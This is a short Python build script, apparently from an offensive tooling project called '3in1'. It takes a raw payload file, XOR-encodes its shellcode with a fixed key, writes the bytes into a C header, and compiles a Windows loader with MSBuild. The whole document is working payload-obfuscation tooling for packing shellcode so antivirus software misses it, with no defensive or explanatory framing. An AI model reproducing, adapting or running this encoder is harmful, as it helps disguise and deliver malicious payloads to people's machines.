# PROGRAMMED BY ORCA
import sys
import os

key = 0x23	
encoded_shellcode = []


def createfile(key, encoded_shellcode):
    if os.path.exists('3in1\shellcode.h'):
        os.remove('3in1\shellcode.h')
    file = open('3in1\shellcode.h', 'w')
    file.seek(0)
    file.write("BYTE key = " + hex(key) + "; \n")
    file.write("unsigned char rawData[] = {" + ', '.join(["0x{:02x}".format(_) for _ in encoded_shellcode]) + "};")
    file.truncate()
    file.close()

def compile():
    os.system("MSBuild.exe -nologo -verbosity:q 3in1.sln /t:3in1 /property:Configuration=Release /property:RuntimeLibrary=MT /property:Platform=x64")

def main():    
    if(len(sys.argv) == 2):
        try:
            text = open(sys.argv[1], "rb").read()
        except:
            print("[!] FILE NOT FOUND")
            sys.exit()
    else:
        print("[!] USAGE: %s <raw payload file> " % sys.argv[0])
        sys.exit()
    for opcode in text: 
        new_opcode = (ord(chr(opcode)) ^ key ) 
        encoded_shellcode.append(new_opcode)
    createfile(key, encoded_shellcode)
    print("[+] File: \"shellcode.h\" is created Succefully")
    print("[+] COMPILING ...")
    compile()
    print("[i] Compiled File Should Be Under: \\x64\\Release\\")
    print("[+] DONE !")

main()
      
